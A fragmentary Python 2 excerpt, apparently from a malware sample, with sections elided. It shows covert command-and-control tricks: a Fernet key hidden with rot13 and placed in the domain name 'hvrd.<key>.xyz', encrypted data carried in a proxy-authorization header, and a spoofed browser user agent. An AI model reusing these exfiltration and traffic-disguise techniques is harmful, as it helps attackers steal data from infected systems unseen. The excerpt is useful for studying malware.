...
def wissenschaft(data,flg):
	...
	rkd = codecs.decode(drk,"rot_13")
	krd = rkd.encode('ascii','ignore')
	f = Fernet(krd)	
...
def zinnsoldat(cretr):
	...
	if "fe23" in cretr:
		...
		global drk
		print "is teamtime"
		krd = Fernet.generate_key()
		drk = codecs.encode(krd,"rot_13")
		dm = ("hvrd." + drk + ".xyz")
...
def sonne(encfil):
	ua = ("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; " + breg + " ) like Gecko")
	headers = {"Content-Type": "text/html", "Accept-Encoding": "text/plain", "User-Agent": ua,"proxy-authorization": encfil}
